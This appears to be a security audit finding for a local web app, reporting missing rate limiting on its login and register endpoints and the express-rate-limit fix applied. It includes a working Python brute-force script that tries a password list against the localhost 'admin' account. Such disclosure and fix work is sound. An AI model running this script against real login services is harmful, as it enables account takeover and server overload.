# Missing Rate Limiting on Login — (High)

## Description

The `/api/login` and `/api/register` endpoints did not restrict request frequency per IP address. An attacker could automate rapid brute-force password guessing without triggering any server-side throttling or IP blocking.

## Exploit

Script: `attacks/brute_login.py`

```python
import requests

url = "http://localhost:3000/api/login"
username = "admin"

with open("passwords.txt", "r", encoding="utf-8") as file:
    lines = file.read().splitlines()

for num, pwd in enumerate(lines):
    r = requests.post(url, json={"username": username, "password": pwd})
    print(f"Try {num} - Password: {pwd} - Status: {r.status_code}")
    if r.status_code == 200:
        print(f"[+] Password found: {pwd}")
        break
```

To reproduce:

```bash
node server.js
python attacks/brute_login.py
```

## Impact

Allows automated dictionary attacks to compromise accounts with weak passwords in seconds. Additionally, since `bcrypt` is CPU-heavy, unthrottled authentication requests cause server CPU exhaustion (application-layer DoS).

## Fix

✅ **Fixed** — Applied `express-rate-limit` middleware directly to authentication routes.

```javascript
const rateLimiter = rateLimit({
  windowMs: 1000 * 60 * 10, // 10 minutes
  max: 5,                   // Max 5 attempts per IP
  standardHeaders: true,
  legacyHeaders: false,
  handler: (req, res) => sendError(res, 429, "Too many requests, try later")
});

app.post("/api/login", rateLimiter, async (req, res) => { ... });
app.post("/api/register", rateLimiter, async (req, res) => { ... });
```

Exceeding 5 attempts within 10 minutes halts execution and returns HTTP `429 Too Many Requests`.